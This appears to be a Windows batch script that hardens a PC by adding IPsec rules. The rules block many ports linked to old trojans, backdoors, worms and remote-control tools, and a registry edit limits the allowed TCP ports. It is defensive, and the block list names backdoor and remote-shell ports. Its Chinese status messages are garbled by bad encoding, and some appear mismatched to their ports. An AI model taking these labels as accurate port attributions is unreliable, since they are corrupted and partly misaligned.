echo �ر�ľ��ICQTrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo �ر�ľ��ShockRaveĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de TroieĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo �ر�ľ��Stealth SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de Troie 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ��Pass RipperĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
echo �ر�ľ��FirehotckerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo �ر�ľ��Attack FTPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade RunnerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
echo �ر�ľ��GirlFriendĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade Runner 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��Fore SchwindlerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade Runner 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo �ر�ľ��Tiny Telnet ServerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo �ر�ľ��Robo-HackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
echo �ر�ľ��KuangĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo �ر�ľ��Senna Spy TrojansĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
echo �ر�ľ��WhackJobĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��GateCrasherĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo �ر�ľ��Phase0Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��PriorityĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade RunnerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote GrabĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo �ر�ľ��IcqTrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo �ر�ľ��InIkillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal Of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
echo �ر�ľ��Progenic TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 3.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
echo �ر�ľ��Prosiak 0.47Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 4.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote Windows ShutdownĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
echo �ر�ľ��ICKillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo �ر�ľ��RoboHackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -x >nul

gpupdate >nul

echo �������� IP ɸѡ������
rem if exist %temp%\ipfilter.reg del %temp%\ipfilter.reg
echo Windows Registry Editor Version 5.00>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters]>>%temp%\ipfilter.reg
echo "EnableSecurityFilters"=dword:00000001>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{F3BBAABC-03A5-4584-A7A0-0251FA38B8B1}]>>%temp%\ipfilter.reg
echo "TCPAllowedPorts"=hex(07):32,00,31,00,00,00,38,00,30,00,00,00,34,00,30,00,30,\>>%temp%\ipfilter.reg
echo  00,30,00,00,00,00,00>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]>>%temp%\ipfilter.reg
echo "EnableSecurityFilters"=dword:00000001>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{F3BBAABC-03A5-4584-A7A0-0251FA38B8B1}]>>%temp%\ipfilter.reg
echo "TCPAllowedPorts"=hex(07):32,00,31,00,00,00,38,00,30,00,00,00,34,00,30,00,30,\>>%temp%\ipfilter.reg
echo  00,30,00,00,00,00,00>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
regedit /s %temp%\ipfilter.reg
del %temp%\ipfilter.reg
echo IP ɸѡ�����óɹ���
echo.
echo.
echo  ���ܾ�������������ϵͳ��������������没����ľ����ŵ����ţ�����������,������������ �غ򣬂��ж�����~~~~~~~~~~~~~~~~~~~~~~  
echo  ******** �ر�ע�⣺��Ҫ�رգ��밴��������� Win ���������˲��ԣ� ********
echo.
pause>nul

rem For PC Server
ipseccmd -w REG -p "HFUT_SECU" -o -x
ipseccmd -w REG -p "HFUT_SECU" -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
echo �ر�����Σ�ն˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus Pro���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
echo �ر����LoveGate���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
echo �ر�ľ��RemoteAnything���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo �ر�ľ��ICQTrojan���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
echo ��ֹ���������ɨ�衭������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
echo ��ֹAuthentication Service���񡭡�����OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
echo ��ֹFingerɨ�衭������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
echo ��ֹ���򴫵ݣ�TCP������ƭDNS��UDP��������������ͨ�š�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
echo �ر�nachi��没�������˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
echo �ر�Telnet ��ľ��Tiny Telnet Server�����˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
echo �ر�Rip �˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo �ر�ľ�����BackDoor��Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر������ڶ�2001��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ripper��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo �ر�ľ�����Wincrash v2��Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
echo �ر�Windows ��Զ�̹����նˣ�Զ�����棩�����˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo �ر�msblast������������˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
echo �ر�Զ�̿��������remote administrator)����˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
echo �ر�Զ�̿������VNC������Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo �ر�Dameware�����Ĭ�ϼ����˿ڣ��ɱ䣡����������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ů����Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroat v1.0 - 3.1Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
echo �ر�ľ��IndoctrinationĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo �ر�ľ��PRIORITYĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ�����羫��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
echo �ر�ľ����������Ĭ�����Ӷ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ĭ�϶˿�(ע��ɱ䣡)��������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo �ر�ľ��WAY2.4Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo �ر�ľ��InIkillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
echo �ر�ľ����ɫ����Ĭ�Ͽ��ŵ�telnet�˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
echo �ر�lovegate ��������ŵ��������Ŷ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo �ر�ľ��SUB7Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSphereĬ�ϵķ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
echo �ر�ľ��BO2000Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
echo �رմ�������Ŀ��ƶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��SchwindlerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!

ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
echo �ر�ľ��Back OrificeĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
echo �ر�ľ��������͵Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo �ر�ľ��ڶ�2000Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSpy DKĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر�ľ��ڶ�2001Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
echo �ر�ľ��BOWhackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo �ر�ľ��BigGluckĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ�����羫��3.0��netspy3.0Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
echo �ر�ľ��The SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters ParadiseĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo �ر�ľ��wry����С�ӣ�����Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţ��netbullĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţ��netbullĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 3.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de TroieĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo �ر�ľ��Sub Seven 2.0+��77������ħ��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��ForeĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote Windows ShutdownĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo �ر�ľ��BO jammerkillahVĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo �ر�ľ��Satanz BackdoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo �ر�ľ��DevilĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��SilencerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
echo �ر�ľ��The tHingĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
echo �ر�ľ��Shivka-BurkaĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
echo �ر�ľ��SpySenderĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus ProĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo �ر�ľ��ShockraveĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
echo �ر�ľ��SubSevenĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��WebExĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSphereĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
echo �ر�ľ��Doly TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��SilencerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo �ر�ľ��Psyber Stream ServerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo �ر�ľ��MilleniumĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
echo �ر�ľ��Ultors TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo �ر�ľ��Devil 1.03Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo �ر�ľ��VooDoo DollĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
echo �ر�ľ��FTP99CMPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo �ر�ľ��Streaming Audio TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo �ر�ľ��BackDoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
echo �ر�ľ��Socket23Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر�ľ��Trojan CowĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��GatecrasherĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ��RipperĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
echo �ر�ľ��BugsĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
echo �ر�ľ��GjamerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo �ر�ľ��Deep ThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo �ر�ľ��IcqTrojenĬ�Ϸ���˿ڡ�������OK!
